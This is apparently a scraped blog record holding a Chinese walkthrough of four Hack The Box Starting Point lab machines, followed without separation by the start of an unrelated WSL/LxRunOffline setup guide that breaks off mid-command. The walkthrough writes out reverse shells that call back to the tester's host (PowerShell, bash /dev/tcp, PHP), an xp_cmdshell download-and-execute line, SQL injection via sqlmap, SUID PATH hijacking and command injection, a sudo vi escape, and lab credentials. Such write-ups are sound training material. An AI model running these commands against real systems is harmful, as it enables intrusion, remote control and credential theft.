[{"content":"Archetype  目标：拿到用户权限与系统权限。\n靶机IP：10.10.10.27。\n 1、信息收集 先使用nmap看看靶机开放了什么端口：\nsudo nmap -sS -sV 10.10.10.27 # 参数讲解 sS：使用SYN半开放式扫描，扫描快，隐蔽性高 sV：探测服务版本 # 扫描结果 Nmap scan report for 10.10.10.27 (10.10.10.27) Host is up (0.28s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000 Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows 比较容易入手的就是445端口对应的SMB服务，1433是SQL Server的默认端口。先尝试能否匿名访问SMB服务，这里使用Kali预装的smbclient：\nsmbclient -N -L //10.10.10.27/ # 参数讲解 N：匿名登录 L：获取共享资源列表 # 结果 Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin backups Disk C$ Disk Default share IPC$ IPC Remote IPC SMB1 disabled -- no workgroup available 获取到了共享资源列表，说明允许匿名访问SMB服务，文件夹后面的$代表为隐藏文件夹，接下来我们匿名登录看一下backups文件夹的内容：\nsmbclient -N //10.10.10.27/backups # 列出当前目录下的文件 smb: \\\u0026gt; dir . D 0 Mon Jan 20 20:20:57 2020 .. D 0 Mon Jan 20 20:20:57 2020 prod.dtsConfig AR 609 Mon Jan 20 20:23:02 2020 10328063 blocks of size 4096. 8260548 blocks available # 下载prod.dtsConfig文件 smb: \\\u0026gt; get prod.dtsConfig getting file \\prod.dtsConfig of size 609 as prod.dtsConfig (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec) 下载的文件会默认存储在当前目录，查看prod.dtsConfig文件：\nvim prod.dtsConfig \u0026lt;DTSConfiguration\u0026gt; \u0026lt;DTSConfigurationHeading\u0026gt; \u0026lt;DTSConfigurationFileInfo GeneratedBy=\u0026#34;...\u0026#34; GeneratedFromPackageName=\u0026#34;...\u0026#34; GeneratedFromPackageID=\u0026#34;...\u0026#34; GeneratedDate=\u0026#34;20.1.2019 10:01:34\u0026#34;/\u0026gt; \u0026lt;/DTSConfigurationHeading\u0026gt; \u0026lt;Configuration ConfiguredType=\u0026#34;Property\u0026#34; Path=\u0026#34;\\Package.Connections[Destination].Properties[ConnectionString]\u0026#34; ValueType=\u0026#34;String\u0026#34;\u0026gt; \u0026lt;ConfiguredValue\u0026gt;Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;\u0026lt;/ConfiguredValue\u0026gt; \u0026lt;/Configuration\u0026gt; \u0026lt;/DTSConfiguration\u0026gt; 这个文件包含了一些数据库连接参数的配置，我们得到帐密ARCHETYPE\\sql_svc，M3g4c0rp123。\nSQL Server有两种身份验证方式：操作系统身份验证和数据库身份验证。这里我们得到的应该是前者，ARCHETYPE代表主机名，sql_svc代表具有数据库登录权限的操作系统用户名，M3g4c0rp123就是密码。\n2、拿Shell 根据nmap扫描结果来看，靶机没有开启远程登录功能，所以可以从数据库下手。\n需要的工具：SecureAuthCorp/impacket: Impacket is a collection of Python classes for working with network protocols. (github.com)\n这是一个用Python编写的后工具集，本次渗透要用到其中的mssqlclient.py，安装过程不再赘述。\n使用操作系统身份验证登录数据库：\npython3 mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth # 输入密码后登录成功 # 数据库身份认证启用了TLS [*] Encryption required, switching to TLS # 当前数据库为master [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 [*] INFO(ARCHETYPE): Line 1: Changed database context to \u0026#39;master\u0026#39;. [*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server (140 3232) [!] Press help for extra shell commands 登录成功后使用SQL Server的IS_SRVROLEMEMBER('sysadmin')判断当前数据库用户是否具有sysadmin权限：\nSELECT IS_SRVROLEMEMBER(\u0026#39;sysadmin\u0026#39;) # 结果 -----------  1 返回结果为1，代表当前数据库用户具有sysadmin权限，可进一步尝试使用xp_cmdshell实现RCE：\n# sp_configure修改数据库配置的存储过程，当show advanced options参数为1时，才能够修改数据库配置中的某些高级选项，其中就有xp_cmdshell，因此需要先设置show advanced options参数 EXEC sp_configure \u0026#39;show advanced options\u0026#39;, 1 [*] INFO(ARCHETYPE): Line 185: Configuration option \u0026#39;show advanced options\u0026#39; changed from 1 to 1. Run the RECONFIGURE statement to install. # 提交上一步使用sp_configure存储过程更改的配置选项 reconfigure # 使用sp_configure存储过程启用xp_cmdshell参数，此参数启用后允许SQL Server调用操作系统命令 EXEC sp_configure \u0026#39;xp_cmdshell\u0026#39;, 1 [*] INFO(ARCHETYPE): Line 185: Configuration option \u0026#39;xp_cmdshell\u0026#39; changed from 1 to 1. Run the RECONFIGURE statement to install. # 提交上一步使用 sp_configure存储过程更改的配置选项 reconfigure # 以上命令也可使用mssqlclient的shell命令一步实现 enable_xp_cmdshell [*] INFO(ARCHETYPE): Line 185: Configuration option \u0026#39;show advanced options\u0026#39; changed from 1 to 1. Run the RECONFIGURE statement to install. [*] INFO(ARCHETYPE): Line 185: Configuration option \u0026#39;xp_cmdshell\u0026#39; changed from 1 to 1. Run the RECONFIGURE statement to install. 查看当前身份：\nxp_cmdshell \u0026#34;whoami\u0026#34; # 结果 output --------------------------------------------------------------------------------  archetype\\sql_svc NULL 查看是否存在开发环境：\nxp_cmdshell \u0026#34;python\u0026#34; # 结果 output --------------------------------------------------------------------------------  \u0026#39;python\u0026#39; is not recognized as an internal or external command, operable program or batch file. NULL 3、获取用户权限 根据之前nmap的扫描结果，靶机应该为Windows Server 2008 R2，在没有开发环境的情况下可以考虑从powershell入手，建立一个powershell的反向shell文件1.ps1：\n$client = New-Object System.Net.Sockets.TCPClient(\u0026#34;10.10.14.62\u0026#34;,443); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2\u0026gt;\u0026amp;1 | Out-String ); $sendback2 = $sendback + \u0026#34;# \u0026#34;; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close() 保存完文件后，不要切换目录，在当前目录起一个HTTP服务器：\npython3 -m http.server 80 开启本地监听：\nnc -lvvp 443 在数据库中执行命令下载并执行脚本：\nxp_cmdshell \u0026#34;powershell \u0026#34;IEX (New-Object Net.WebClient).DownloadString(\\\u0026#34;http://10.10.14.62/1.ps1\\\u0026#34;);\u0026#34; 下载成功后可以看到Web服务器和nc都有对应的连接信息，切换到nc窗口，回车发现拿到了靶机的shell交互：\n# 查看当前用户身份 whoami # 结果 archetype\\sql_svc # 查看当前路径 pwd # 结果 Path ---- C:\\Windows\\system32 # 查看桌面文件 dir C:\\Users\\sql_svc\\Desktop Directory: C:\\Users\\sql_svc\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 2/25/2020 6:37 AM 32 user.txt # 查看user.txt type C:\\Users\\sql_svc\\Desktop\\user.txt 4、提权 查看powershell历史记录：\ntype C:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt # 结果 net.exe use T: \\\\Archetype\\backups /user:administrator MEGACORP_4dm1n!! exit 发现administrator将文件夹\\Archetype\\backups映射到T盘，MEGACORP_4dm1n!!为密码。\n尝试使用impakcet中的psexec.py提权：\npython3 psexec.py administrator@10.10.10.27 # 连接信息 [*] Requesting shares on 10.10.10.27..... [*] Found writable share ADMIN$ [*] Uploading file TPMzHnhC.exe [*] Opening SVCManager on 10.10.10.27..... [*] Creating service yQAe on 10.10.10.27..... [*] Starting service yQAe..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.17763.107] (c) 2018 Microsoft Corporation. All rights reserved. # 查看当前身份 C:\\Windows\\system32\u0026gt;whoami nt authority\\system # 查看桌面目录 dir C:\\Users\\Administrator\\Desktop # 结果 Directory of C:\\Users\\Administrator\\Desktop 01/20/2020 06:42 AM \u0026lt;DIR\u0026gt; . 01/20/2020 06:42 AM \u0026lt;DIR\u0026gt; .. 02/25/2020 07:36 AM 32 root.txt 1 File(s) 32 bytes 2 Dir(s) 33,833,361,408 bytes free # 查看root.txt type C:\\Users\\Administrator\\Desktop\\root.txt Oopsie  目标：拿到用户权限与系统权限。\n靶机IP：10.10.10.28。\n 1、信息收集 nmap查看靶机信息：\nsudo nmap -sS -sV 10.10.10.28 # 结果 Nmap scan report for 10.10.10.28 (10.10.10.28) Host is up (0.37s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 开启22和80端口，直接访问网页，发现有一个登录关键字，但是没有对应的链接：\n可能是将登录页面隐藏了，可通过两种方法进一步挖掘：\n1、F12打开控制台查看页面元素，翻到最下面可以发现一个登录页面的js脚本：\n\u0026lt;script src=\u0026#34;/cdn-cgi/login/script.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 2、bp抓包查看站点地图：\n进入登录页面后尝试帐密admin/MEGACORP_4dm1n!!，密码为上一关获得的administrator 的密码。\n登录成功后有一个文件上传功能，点击后显示当前行为需要超级管理员权限，抓包看一下当前的请求包：\nGET /cdn-cgi/login/admin.php?content=uploads HTTP/1.1 Host: 10.10.10.28 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://10.10.10.28/cdn-cgi/login/admin.php Connection: close Cookie: user=34322; role=admin Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 发现Cookie处有一个user字段和role字段对当前身份进行判断，我们把当前数据包发送至Inturder模块，对user值爆破试试：\n值为86575时，文件上传功能正常。\n但是这样跑太费时间了，再回头看看其他页面，发现访问Account页面时URL如下：\nhttp://10.10.10.28/cdn-cgi/login/admin.php?content=accounts\u0026amp;id=1 id的值应该有一些用处，尝试修改为1、2、3、4，发现到4时回显另一个用户的信息，bp抓包放进Intruder跑一下：\n同样获得了超级管理员的Access ID，接下来我们抓取访问文件上传页面的数据包，将user字段的值改为获取到的超级管理员的Access ID，转发后可成功进入文件上传页面，在选中文件后点击上传，再次修改转发包即可成功上传文件。\n2、获取用户权限 上传文件后，下一步肯定需要知道文件的上传路径，使用dirsearch扫一下目录：\npython3 dirsearch.py -u http://10.10.10.28/ # 结果 301 - 312B - /uploads -\u0026gt; http://10.10.10.28/uploads/ 尝试上传一句话，蚁剑连接不上，使用Kali自带的PHP反弹Shell试试：\n# 将自带Shell复制一份到当前目录 cp /usr/share/webshells/php/php-reverse-shell.php ./ # 修改IP和port为本机信息 $ip = \u0026#39;\u0026lt;本机IP\u0026gt;\u0026#39; $port = \u0026lt;监听端口\u0026gt; 打开两个命令终端：\n# 终端1，监听本机端口 nc -lvvp \u0026lt;监听端口\u0026gt; # 终端2，请求1.php curl http://10.10.10.28/uploads/1.php 运行完上述两条命令后，可以发现监听窗口反弹了一个Shell，权限为网站权限：\n$ id uid=33(www-data) gid=33(www-data) groups=33(www-data) 切换到网站目录：\ncd /var/www/html # 通过ls命令查看当前目录文件，直到最终切换到/var/www/html/cdn-cgi/login目录，发现有如下文件 $ ls admin.php db.php index.php script.js # 查看db.php $ cat db.php \u0026lt;?php $conn = mysqli_connect(\u0026#39;localhost\u0026#39;,\u0026#39;robert\u0026#39;,\u0026#39;M3g4C0rpUs3r!\u0026#39;,\u0026#39;garage\u0026#39;); ?\u0026gt; 我们得到了一个数据库的账号，接下来看看这个账号的信息：\n$ id robert uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker) 发现这个用户属于两个组，先查看一下这个用户的家目录：\n$ ls /home/robert user.txt user.txt就是用户的flag，接下来获取root的flag。\n3、提权 从bugtracker用户组入手，查找其是否拥有特殊权限：\n$ find -type f -group bugtracker 2\u0026gt;/dev/null 命令没有回显，执行以下命令升级Shell：\nSHELL=/bin/bash script -q /dev/null 继续执行之前的命令：\nwww-data@oopsie:/$ find -type f -group bugtracker 2\u0026gt;/dev/null find -type f -group bugtracker 2\u0026gt;/dev/null ./usr/bin/bugtracker 切换到robert用户：\nwww-data@oopsie:/$ su - robert 查看bugtracker：\nrobert@oopsie:~$ ls -la /usr/bin/bugtracker ls -la /usr/bin/bugtracker -rwsr-xr-- 1 root bugtracker 8792 Jan 25 2020 /usr/bin/bugtracker 发现其具有s权限，其作用在于用户可使用其所有者权限来运行程序，也就是说，在用户执行bugtracker程序时，将获取文件所有者，即root的权限及UID、GID。\n运行bugtracker看看：\nrobert@oopsie:~$ bugtracker bugtracker ------------------ : EV Bug Tracker : ------------------ Provide Bug ID: 1 1 --------------- Binary package hint: ev-engine-lib Version: 3.3.3-1 Reproduce: When loading library in firmware it seems to be crashed What you expected to happen: Synchronized browsing to be enabled since it is enabled for that site. What happened instead: Synchronized browsing is disabled. Even choosing VIEW \u0026gt; SYNCHRONIZED BROWSING from menu does not stay enabled between connects. 使用strings命令打印出可打印字符：\nrobert@oopsie:~$ strings /usr/bin/bugtracker # 发现命令调用 cat /root/reports/ bugtracker调用了系统的cat命令输出位于/root/reports目录下的bug报告，且调用cat命令时并未使用绝对路径，即在当前用户的$PATH环境变量中有相应配置。\n方法一 我们可以创建一个名为cat的恶意命令并修改当前用户$PATH值，让bugtracker调用恶意构造的命令，进一步获取root权限。具体思路为：\n以robert的身份将/tmp目录设置为$PATH环境变量的第一个目录，然后切换到/tmp目录构造恶意cat命令并赋执行权，使bugtracker实际上调用了恶意构造的cat命令。\n命令如下：\nrobert@oopsie:~$ echo $PATH echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin robert@oopsie:~$ export PATH=/tmp:$PATH export PATH=/tmp:$PATH robert@oopsie:~$ echo $PATH echo $PATH /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin robert@oopsie:~$ cd /tmp cd /tmp robert@oopsie:/tmp$ echo \u0026#39;/bin/bash\u0026#39; \u0026gt; cat echo \u0026#39;/bin/bash\u0026#39; \u0026gt; cat robert@oopsie:/tmp$ chmod +x cat 再次运行bugtracker就会以root身份执行一个shell了。\n方法二（推荐） 只需在运行bugtracker时输入如下命令：\nrobert@oopsie:/tmp$ bugtracker bugtracker ------------------ : EV Bug Tracker : ------------------ Provide Bug ID: 111;\u0026#39;/bin/bash\u0026#39; 111;\u0026#39;/bin/bash\u0026#39; --------------- cat: /root/reports/111: No such file or directory 此时便会以root身份执行一个shell：\nroot@oopsie:/tmp# id id uid=0(root) gid=1000(robert) groups=1000(robert),1001(bugtracker) 查看/root目录下所有文件：\nroot@oopsie:/tmp# ls -a /root ls -a /root . .bash_history .cache .gnupg .profile root.txt .viminfo .. .bashrc .config .local reports .ssh 下一关信息：\n切换到/root/.config/filezilla，查看filezilla.xml：\nroot@oopsie:/root/.config/filezilla# cat filezilla.xml 内容：\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; standalone=\u0026#34;yes\u0026#34; ?\u0026gt; \u0026lt;FileZilla3\u0026gt; \u0026lt;RecentServers\u0026gt; \u0026lt;Server\u0026gt; \u0026lt;Host\u0026gt;10.10.10.46\u0026lt;/Host\u0026gt; \u0026lt;Port\u0026gt;21\u0026lt;/Port\u0026gt; \u0026lt;Protocol\u0026gt;0\u0026lt;/Protocol\u0026gt; \u0026lt;Type\u0026gt;0\u0026lt;/Type\u0026gt; \u0026lt;User\u0026gt;ftpuser\u0026lt;/User\u0026gt; \u0026lt;Pass\u0026gt;mc@F1l3ZilL4\u0026lt;/Pass\u0026gt; \u0026lt;Logontype\u0026gt;1\u0026lt;/Logontype\u0026gt; \u0026lt;TimezoneOffset\u0026gt;0\u0026lt;/TimezoneOffset\u0026gt; \u0026lt;PasvMode\u0026gt;MODE_DEFAULT\u0026lt;/PasvMode\u0026gt; \u0026lt;MaximumMultipleConnections\u0026gt;0\u0026lt;/MaximumMultipleConnections\u0026gt; \u0026lt;EncodingType\u0026gt;Auto\u0026lt;/EncodingType\u0026gt; \u0026lt;BypassProxy\u0026gt;0\u0026lt;/BypassProxy\u0026gt; \u0026lt;/Server\u0026gt; \u0026lt;/RecentServers\u0026gt; \u0026lt;/FileZilla3\u0026gt; Accine  目标：拿下系统权限。\n靶机IP：10.10.10.46。\n 1、信息收集 sudo nmap -sS -sV 10.10.10.46 # 结果 Nmap scan report for 10.10.10.46 (10.10.10.46) Host is up (0.30s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel 直接访问HTTP服务，需要帐密，上一关我们只获得了一个ftp用户，尝试登录ftp服务器：\nftp://ftpuser:mc@F1l3ZilL4@10.10.10.46/ 下载得到backup.zip文件，解压的时候发现有密码，尝试使用常规暴力破解，时间太长顶不住。。。考虑先获取backup.zip的hash值，再使用john进行破解。\n获取hash（在root下运行）：\nzip2john /home/oopsdc/Downloads/backup.zip \u0026gt; hash 使用john对哈希文件进行破解：\njohn hash # 结果 Using default input encoding: UTF-8 Loaded 1 password hash (PKZIP [32/64]) Will run 2 OpenMP threads Proceeding with single, rules:Single Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status Warning: Only 5 candidates buffered for the current salt, minimum 8 needed for performance. Warning: Only 4 candidates buffered for the current salt, minimum 8 needed for performance. Almost done: Processing the remaining buffered candidate passwords, if any. Warning: Only 6 candidates buffered for the current salt, minimum 8 needed for performance. Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist 741852963 (backup.zip) 1g 0:00:00:00 DONE 2/3 (2021-09-16 10:00) 25.00g/s 1798Kp/s 1798Kc/s 1798KC/s 123456..Peter Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed 解压后得到index.php和style.css两个文件，在index.php中发现了用户帐密：\n\u0026lt;?php session_start(); if(isset($_POST[\u0026#39;username\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;password\u0026#39;])) { if($_POST[\u0026#39;username\u0026#39;] === \u0026#39;admin\u0026#39; \u0026amp;\u0026amp; md5($_POST[\u0026#39;password\u0026#39;]) === \u0026#34;2cb42f8734ea607eefed3b70af13bbd3\u0026#34;) { $_SESSION[\u0026#39;login\u0026#39;] = \u0026#34;true\u0026#34;; header(\u0026#34;Location: dashboard.php\u0026#34;); } } ?\u0026gt;对密码进行md5解密，得到最终帐密admin/qwerty789。\n2、获取用户权限 登录后是一个目录页面，尝试搜索：\n页面回显不对，再次尝试1'发现有报错语句，F12拿一下当前的PHPSESSION，使用sqlmap查看当前数据库信息：\nsqlmap -u \u0026#34;http://10.10.10.46/dashboard.php?search=1\u0026#34; -dbs --cookie \u0026#34;PHPSESSID=dudnfpur8hjgfam3gb22nna4sf\u0026#34; # 结果 [INFO] the back-end DBMS is PostgreSQL web server operating system: Linux Ubuntu 19.10 or 20.04 (focal or eoan) web application technology: Apache 2.4.41 back-end DBMS: PostgreSQL [WARNING] schema names are going to be used on PostgreSQL for enumeration as the counterpart to database names on other DBMSes [INFO] fetching database (schema) names [INFO] retrieved: \u0026#39;public\u0026#39; [INFO] retrieved: \u0026#39;pg_catalog\u0026#39; [INFO] retrieved: \u0026#39;information_schema\u0026#39; available databases [3]: [*] information_schema [*] pg_catalog [*] public 可以发现当前是Posgtre数据库，尝试能否执行os-shell：\nsqlmap -u http://10.10.10.46/dashboard.php?search=1 --cookie \u0026#34;PHPSESSID=dudnfpur8hjgfam3gb22nna4sf\u0026#34; --os-shell # 结果 os-shell\u0026gt; whoami do you want to retrieve the command standard output? [Y/n/a] n [10:43:23] [INFO] retrieved: \u0026#39;postgres\u0026#39; 这里简要介绍一下os-shell的原理及使用条件：\n原理：使用into outfile函数将可用来上传文件的a.php上传至网站根目录，然后再利用a.php上传一个用于执行并回显系统命令的b.php。\n使用条件：1、网站必须为root权限；2、需要知道网站绝对路径；3、CGP为off，PHP主动转义功能关闭。\n接下来我们简单反弹一个shell，在os-shell中执行如下命令：\nbash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.15.188/1234 0\u0026gt;\u0026amp;1\u0026#39; 切换到网站根目录并列出文件：\nostgres@vaccine:/var/lib/postgresql/11/main$ cd /var/www/html cd /var/www/html postgres@vaccine:/var/www/html$ ls ls # 结果 bg.png dashboard.css dashboard.js dashboard.php index.php license.txt style.css 查看dashboard.php内容：\npostgres@vaccine:/var/www/html$ cat dashboard.php cat dashboard.php # 得到一个用户账号 try { $conn = pg_connect(\u0026#34;host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!\u0026#34;); } 尝试直接ssh到主机：\npostgres@vaccine:~$ id uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert) 3、提权 查看当前用户的sudo权限：\npostgres@vaccine:~$ sudo -l [sudo] password for postgres: Matching Defaults entries for postgres on vaccine: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User postgres may run the following commands on vaccine: (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf pg_hba.conf为PostgreSQL的访问策略配置文件，默认位于/var/lib/pgsql/\u0026lt;version\u0026gt;/data/目录。\n运行提示的命令：\npostgres@vaccine:~$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf 进入文件后默认为命令模式，按下Shift+:进入末行模式，运行!/bin/bash命令，注：需要在前面加一个空格：\n: !/bin/bash 此时会退出vi编辑器，且用户变为root：\nroot@vaccine:/var/lib/postgresql# id uid=0(root) gid=0(root) groups=0(root) 提权成功。\nShield  目标：拿到系统权限。\n靶机IP：10.10.10.29。\n吐槽：这真是一个卡到爆的靶场。\n 1、信息收集 上nmap：\nsudo nmap -sS -sV 10.10.10.29 # 结果 Nmap scan report for 10.10.10.29 (10.10.10.29) Host is up (0.48s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 3306/tcp open mysql MySQL (unauthorized) Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows 靶机开了80端口，用dirsearch扫一下目录：\nsudo python3 dirsearch.py -u http://10.10.10.29/ # 结果 301 - 0B - /Wordpress/ -\u0026gt; http://10.10.10.29/wordpress/ 使用Wappalyzer查看当前WP版本为5.2.1，IIS版本为10，尝试利用WP版本未授权访问漏洞查看敏感页面，无果。资料：\nWordpress(CVE-2019-17671)未授权访问漏洞复现 - FreeBuf网络安全行业门户\n点击登录链接，尝试之前获得的密码，试出帐密admin/P@s5w0rd!。\n有个媒体上传链接，点击其中已存在的图片查看保存路径：\nhttp://10.10.10.29/wordpress/wp-content/uploads/black-shield-shape-drawing-illustration-png-clip-art.png 尝试上传小马，各种绕过，奈何网络太差，总有莫名其妙的报错，放弃。\n2、拿WebShell 祭出msf：\n# 启动matesploit framwork msfconsole # 使用模块 msf6 \u0026gt; use exploit/unix/webapp/wp_admin_shell_upload # 查看参数 msf6 exploit(unix/webapp/wp_admin_shell_upload) \u0026gt; show options Module options (exploit/unix/webapp/wp_admin_shell_upload): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD yes The WordPress password to authenticat e with Proxies no A proxy chain of format type:host:por t[,type:host:port][...] RHOSTS yes The target host(s), see https://githu b.com/rapid7/metasploit-framework/wik i/Using-Metasploit RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connec tions TARGETURI / yes The base path to the wordpress applic ation USERNAME yes The WordPress username to authenticat e with VHOST no HTTP server virtual host Payload options (php/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.211.55.8 yes The listen address (an interface may be s pecified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 WordPress # 设置参数 msf6 exploit(unix/webapp/wp_admin_shell_upload) \u0026gt; set PASSWORD P@s5w0rd! PASSWORD =\u0026gt; P@s5w0rd! msf6 exploit(unix/webapp/wp_admin_shell_upload) \u0026gt; set RHOSTS 10.10.10.29 RHOSTS =\u0026gt; 10.10.10.29 msf6 exploit(unix/webapp/wp_admin_shell_upload) \u0026gt; set TARGETURI /wordpress TARGETURI =\u0026gt; /wordpress msf6 exploit(unix/webapp/wp_admin_shell_upload) \u0026gt; set USERNAME admin USERNAME =\u0026gt; admin msf6 exploit(unix/webapp/wp_admin_shell_upload) \u0026gt; set LHOST 10.10.14.43 LHOST =\u0026gt; 10.10.14.43 # 输入run执行攻击，首先在Kali的4444默认端口使用我们输入的帐密建立反向TCP连接，然后上传payload到网站，成功后自动清除payload并建立meterpreter shell连接 再怎么弄都不成功，本地搭的环境却可以，离谱，下一关。\n","permalink":"https://oopsdc.com/post/htb-starting-point/","summary":"Archetype  目标：拿到用户权限与系统权限。\n靶机IP：10.10.10.27。\n 1、信息收集 先使用nmap看看靶机开放了什么端口：\nsudo nmap -sS -sV 10.10.10.27 # 参数讲解 sS：使用SYN半开放式扫描，扫描快，隐蔽性高 sV：探测服务版本 # 扫描结果 Nmap scan report for 10.10.10.27 (10.10.10.27) Host is up (0.28s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000 Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows 比较容易入手的就是445端口对应的SMB服务，1433是SQL Server的默认端口。先尝试能否匿名访问SMB服务，这里使用Kali预装的smbclient：","title":"HTB-Starting Point"},{"content":"一、简介 WSL有多香就不介绍了，但其原生命令较为简陋、默认安装在C盘，稍有不足。而LxRunOffline能够安装任意发行版系统到任意目录，且具备转移已安装WSL目录、备份等功能，是一个极好的WSL管理软件。\n项目地址：GitHub - DDoSolitary/LxRunOffline: A full-featured utility for managing Windows Subsystem for Linux (WSL)\n二、安装LxRunOffline  常规安装：下载项目，手动安装 通过Chocolatey安装：  choco install lxrunoffline  通过Scoop安装：  scoop bucket add extras scoop install lxrunoffline LxRunOffline参数介绍：\nl , list - 列出所有已安装的发行版。\rgd , get-default - 获取 bash.exe 使用的默认发行版。\rsd , set-default - 设置 bash.exe 使用的默认发行版。\ri , install - 安装新的发行版。\rsd , set-default - 设置 bash.exe 使用的默认发行版。\rui , uninstall - 卸载发行版。\rrg , register - 注册现有的安装目录。\rur , unregister - 取消注册发行版但不删除安装目录。\rm , move - 将发行版移动到新目录。\rd , duplicate - 在新目录中复制现有发行版。\re , export - 将发行版的文件系统导出到.tar.gz 文件，该文件可以通过 install 命令安装。\rr , run - 在发行版中运行命令。\rdi , get-dir - 获取发行版的安装目录。\rgv , get-version - 获取发行版的文件系统版本。\rge , get-env - 获取发行版的默认环境变量。\rse , set-env - 设置发行版的默认环境变量。\rae , add-env - 添加到发行版的默认环境变量。\rre , remove-env - 从发行版的默认环境变量中删除。\rgu , get-uid - 获取发行版的默认用户的 UID。\rsu , set-uid - 设置发行版的默认用户的 UID。\rgk , get-kernelcmd - 获取发行版的默认内核命令行。\rsk , set-kernelcmd - 设置发行版的默认内核命令行。\rgf , get-flags - 获取发行版的一些标志。有关详细信息，请参考这里。\rsf , set-flags - 设置发行版的一些标志。有关详细信息，请参考这里。\rs , shortcut - 创建启动发行版的快捷方式。\rec , export-config - 将发行版配置导出到 XML 文件。\ric , import-config - 从 XML 文件导入发行版的配置。\rsm , summary - 获取发行版的一般信息。\r三、安装WSL 1、开启WSL功能 首先检查自己的电脑是否开启了WSL功能，没有的话运行以下命令开启并重启电脑：\nEnable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux 2、下载镜像 以下列出两种镜像下载方式：\n WSL官方离线包：Manually download Windows Subsystem for Linux (WSL) Distros | Microsoft Docs LxRunOffline WiKi中的镜像：Home · DDoSolitary/LxRunOffline Wiki · GitHub  如果是从微软官方下载WSL离线包，文件后缀为.appx，我们手动改为.zip，然后解压，install.tar.gz就是我们后续使用的安装文件。\n3、开启当前目录大小写敏感 Windows文件系统默认不区分大小写，而Linux是区分的，这就导致在安装、运行部分软件时会报错，我们新建一个用于存放WSL的目录，打开powershell并切换到相应目录，运行以下命令开启当前目录大小写敏感：\nfsutil.exe file setCaseSensitiveInfo .\\ enable # .\\ 表示当前目录，此处参数可自定义 查看某个目录是否大小写敏感：\nfsutil.exe file queryCaseSensitiveInfo \u0026lt;path\u0026gt; 禁用大小写敏感：\nfsutil.exe file setCaseSensitiveInfo 